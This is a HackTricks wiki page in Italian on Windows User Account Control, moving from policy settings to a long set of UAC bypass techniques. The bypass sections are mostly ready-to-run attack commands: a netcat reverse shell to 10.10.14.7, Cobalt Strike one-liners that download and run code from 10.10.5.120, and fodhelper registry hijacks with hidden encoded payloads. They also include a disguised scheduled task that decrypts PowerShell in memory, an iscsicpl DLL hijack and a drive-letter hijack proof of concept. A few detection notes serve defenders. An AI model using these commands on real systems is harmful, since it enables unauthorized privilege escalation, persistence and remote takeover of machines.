# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **consent prompt per attività elevate**. Le applicazioni hanno diversi livelli di `integrity`, e un programma con un **livello alto** può eseguire attività che **potrebbero potenzialmente compromettere il sistema**. Quando UAC è abilitato, applicazioni e task **vengono sempre eseguiti nel contesto di sicurezza di un account non amministratore**, a meno che un amministratore non autorizzi esplicitamente queste applicazioni/task ad avere accesso a livello amministratore al sistema per essere eseguite. È una funzionalità di comodità che protegge gli amministratori da modifiche involontarie, ma non è considerata un security boundary.

Per maggiori info sui livelli di integrità:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è presente, a un utente amministratore vengono assegnati 2 token: una chiave utente standard, per eseguire azioni normali a livello standard, e uno con i privilegi admin.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) descrive in grande dettaglio come funziona UAC e include il processo di logon, l'esperienza utente e l'architettura di UAC. Gli amministratori possono usare security policies per configurare come UAC funziona specificamente per la loro organizzazione a livello locale (usando secpol.msc), oppure configurarlo e distribuirlo tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono discusse in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Group Policy che possono essere impostate per UAC. La tabella seguente fornisce ulteriori dettagli:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Le **local security policies** ("secpol.msc" sulla maggior parte dei sistemi) sono configurate per default per **impedire agli utenti non-admin di eseguire installazioni software**. Questo significa che anche se un utente non-admin può scaricare l'installer del tuo software, non sarà in grado di eseguirlo senza un account admin.

### Registry Keys to Force UAC to Ask for Elevation

Come utente standard senza diritti admin, puoi assicurarti che l'account "standard" venga **richiesto da UAC di inserire le credenziali** quando tenta di eseguire determinate azioni. Questa azione richiederebbe la modifica di alcuni **registry keys**, per cui servono permessi admin, a meno che non ci sia un **UAC bypass**, oppure l'attacker sia già loggato come admin.

Anche se l'utente è nel gruppo **Administrators**, queste modifiche costringono l'utente a **reinserire le credenziali del proprio account** per eseguire azioni amministrative.

**L'unico svantaggio è che questo approccio necessita che UAC sia disabilitato per funzionare, cosa che è improbabile negli ambienti di produzione.**

Le registry keys e le entry che devi modificare sono le seguenti (con i valori di default tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Questo può essere fatto anche manualmente tramite lo strumento Local Security Policy. Una volta modificato, le operazioni amministrative richiedono all'utente di reinserire le proprie credenziali.

### Note

**User Account Control non è un security boundary.** Pertanto, gli utenti standard non possono uscire dal proprio account e ottenere diritti admin senza un local privilege escalation exploit.

### Chiedi a un utente l'accesso a 'full computer access'
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode usa integrity checks per impedire ai processi ad high-integrity-level (come i web browser) di accedere a dati a low-integrity-level (come la cartella dei file Internet temporanei). Questo avviene eseguendo il browser con un token low-integrity. Quando il browser tenta di accedere ai dati archiviati nella zona low-integrity, il sistema operativo controlla il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità aiuta a prevenire che gli attacchi di remote code execution ottengano accesso a dati sensibili sul sistema.
- Quando un utente effettua il logon a Windows, il sistema crea un access token che contiene un elenco dei privilegi dell'utente. I privileges sono definiti come la combinazione dei diritti e delle capabilities di un utente. Il token contiene anche un elenco delle credenziali dell'utente, che sono le credenziali usate per autenticare l'utente al computer e alle risorse sulla rete.

### Autoadminlogon

Per configurare Windows in modo da effettuare automaticamente il logon di un utente specifico all'avvio, imposta la **`AutoAdminLogon` registry key**. Questo è utile per ambienti kiosk o per scopi di testing. Usalo solo su sistemi sicuri, perché espone la password nel registry.

Imposta le seguenti chiavi usando Registry Editor o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Per ripristinare il comportamento normale del logon, imposta `AutoAdminLogon` a 0.

## UAC bypass

> [!TIP]
> Nota che se hai accesso grafico alla victim, UAC bypass è diretto, perché puoi semplicemente cliccare su "Yes" quando appare il prompt UAC

Il UAC bypass è necessario nella seguente situazione: **UAC è attivato, il tuo processo è in esecuzione in un contesto medium integrity, e il tuo user appartiene al gruppo administrators**.

È importante menzionare che è **molto più difficile bypassare UAC se è al massimo livello di sicurezza (Always) rispetto a quando è a uno degli altri livelli (Default).**

### UAC disabled

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**) puoi **eseguire una reverse shell con privilegi admin** (high integrity level) usando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass con token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** Basic UAC "bypass" (accesso completo al file system)

Se hai una shell con un user che è dentro il gruppo Administrators puoi **montare la share C$** condivisa via SMB (file system) in locale come un nuovo disco e avrai **accesso a tutto il contenuto del file system** (anche la cartella home di Administrator).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con cobalt strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al suo livello massimo di sicurezza
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** hanno anche diversi moduli per **bypass** di **UAC**.

### KRBUACBypass

Documentazione e tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)che è una **compilation** di diversi UAC bypass exploits. Nota che dovrai **compilare UACME usando visual studio o msbuild**. La compilation creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`) , dovrai sapere **quale ti serve.**\
Dovresti **fare attenzione** perché alcuni bypass **apriranno altri programmi** che **avviseranno** l'**utente** che sta succedendo qualcosa.

UACME ha la **build version** dalla quale ogni tecnica ha iniziato a funzionare. Puoi cercare una tecnica che interessi le tue versioni:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Anche, usando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina ottieni la release di Windows `1607` dalle versioni di build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binario attendibile `fodhelper.exe` è auto-elevated sui Windows moderni. Quando viene avviato, interroga il percorso del registry per utente qui sotto senza validare il verbo `DelegateExecute`. Inserire un comando lì consente a un processo con Medium Integrity (l’utente è in Administrators) di avviare un processo con High Integrity senza un prompt UAC.

Percorso del registry interrogato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Passaggi PowerShell (imposta il tuo payload, poi attiva)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Funziona quando l’utente corrente è membro di Administrators e il livello UAC è predefinito/lenient (non Always Notify con restrizioni extra).
- Usa il percorso `sysnative` per avviare un PowerShell a 64-bit da un processo a 32-bit su Windows a 64-bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd, o un percorso EXE). Evita interfacce che richiedono input per stealth.

#### Variante CurVer/extension hijack (solo HKCU)

I campioni recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore per-user `CurVer`. Il binario auto-elevato risolve ancora l’handler sotto `HKCU`, quindi non serve un token admin per creare le chiavi:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una volta elevato, il malware comunemente **disabilita i prompt futuri** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` a `0`, poi esegue ulteriore defense evasion (ad es. `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistence per eseguire con high integrity. Un tipico task di persistence memorizza su disco uno **script PowerShell cifrato con XOR** e lo decodifica/esegue in-memory ogni ora:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Questa variante continua a ripulire il dropper e lascia solo i payload staged, facendo sì che il rilevamento dipenda dal monitoraggio dell’hijack di **`CurVer`**, dal tampering di `ConsentPromptBehaviorAdmin`, dalla creazione di exclusion di Defender o da scheduled tasks che decrittano PowerShell in memory.

#### More UAC bypass

**Tutte** le tecniche usate qui per bypassare AUC **richiedono** una **full interactive shell** con la vittima (una normale shell nc.exe non basta).

Puoi ottenerla usando una sessione **meterpreter**. Migra verso un **process** che abbia il valore **Session** uguale a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC Bypass with GUI

Se hai accesso a una **GUI puoi semplicemente accettare il prompt UAC** quando appare, non hai davvero bisogno di un bypass. Quindi, ottenere accesso a una GUI ti permetterà di bypassare UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente via RDP) ci sono **alcuni tool che gireranno come administrator** da cui potresti **eseguire** un **cmd** per esempio **come admin** direttamente senza essere nuovamente bloccato da UAC come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po’ più **stealthy**.

### Noisy brute-force UAC bypass

Se non ti interessa essere noisy puoi sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) che **chiede di elevare i permessi finché l’utente non li accetta**.

### Your own bypass - Basic UAC bypass methodology

Se dai un’occhiata a **UACME** noterai che **la maggior parte dei UAC bypass sfrutta una vulnerabilità di Dll Hijacking** (principalmente scrivendo la dll malevola in _C:\Windows\System32_). [Leggi questo per imparare come trovare una vulnerabilità di Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binary che farà **autoelevate** (verifica che quando viene eseguito funzioni a un high integrity level).
2. Con procmon trova eventi "**NAME NOT FOUND**" che potrebbero essere vulnerabili a **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL dentro alcuni **protected paths** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassarlo usando:
1. **wusa.exe**: Windows 7,8 e 8.1. Permette di estrarre il contenuto di un file CAB dentro protected paths (perché questo tool viene eseguito da un high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL dentro il protected path ed eseguire il binary vulnerabile e autoelevated.

### Another UAC bypass technique

Consiste nel verificare se un **autoElevated binary** prova a **leggere** dal **registry** il **nome/percorso** di un **binary** o comando da **eseguire** (questo è più interessante se il binary cerca queste informazioni dentro **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Il `C:\Windows\SysWOW64\iscsicpl.exe` a 32-bit è un binary **auto-elevated** che può essere abusato per caricare `iscsiexe.dll` tramite search order. Se puoi inserire una `iscsiexe.dll` malevola dentro una cartella **scrivibile dall’utente** e poi modificare il `PATH` dell’utente corrente (per esempio via `HKCU\Environment\Path`) in modo che quella cartella venga cercata, Windows potrebbe caricare la DLL dell’attaccante dentro il process elevato `iscsicpl.exe` **senza mostrare un prompt UAC**.

Note pratiche:
- Questo è utile quando l’utente corrente è in **Administrators** ma sta girando a **Medium Integrity** a causa di UAC.
- La copia **SysWOW64** è quella rilevante per questo bypass. Tratta la copia **System32** come un binary separato e valida il comportamento in modo indipendente.
- Il primitive è una combinazione di **auto-elevation** e **DLL search-order hijacking**, quindi lo stesso workflow di ProcMon usato per altri UAC bypass è utile per validare la mancanza di caricamento della DLL.

Flusso minimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idee di rilevamento:
- Mettere un alert su `reg add` / scritture nel registry su `HKCU\Environment\Path` immediatamente seguite dall’esecuzione di `C:\Windows\SysWOW64\iscsicpl.exe`.
- Cercare `iscsiexe.dll` in posizioni **user-controlled** come `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlare i launch di `iscsicpl.exe` con processi figli inattesi o DLL load da directory fuori dai normali percorsi di Windows.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens con map per-sessione `\Sessions\0\DosDevices/<LUID>`. La directory viene creata in modo lazy da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l’attaccante impersona il shadow-admin token solo a **SecurityIdentification**, la directory viene creata con l’attaccante come **owner** (eredita `CREATOR OWNER`), permettendo link di lettere di unità che hanno precedenza su `\GLOBAL??`.

**Passi:**

1. Da una sessione a privilegi bassi, chiamare `RAiProcessRunOnce` per avviare un `runonce.exe` shadow-admin senza prompt.
2. Duplicare il suo primary token in un token di **identification** e impersonarlo mentre si apre `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` sotto ownership dell’attaccante.
3. Creare lì un symlink `C:` che punti a storage controllato dall’attaccante; gli accessi successivi al filesystem in quella sessione risolvono `C:` nel path dell’attaccante, consentendo DLL/file hijack senza prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – raccolta di tecniche di bypass UAC](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
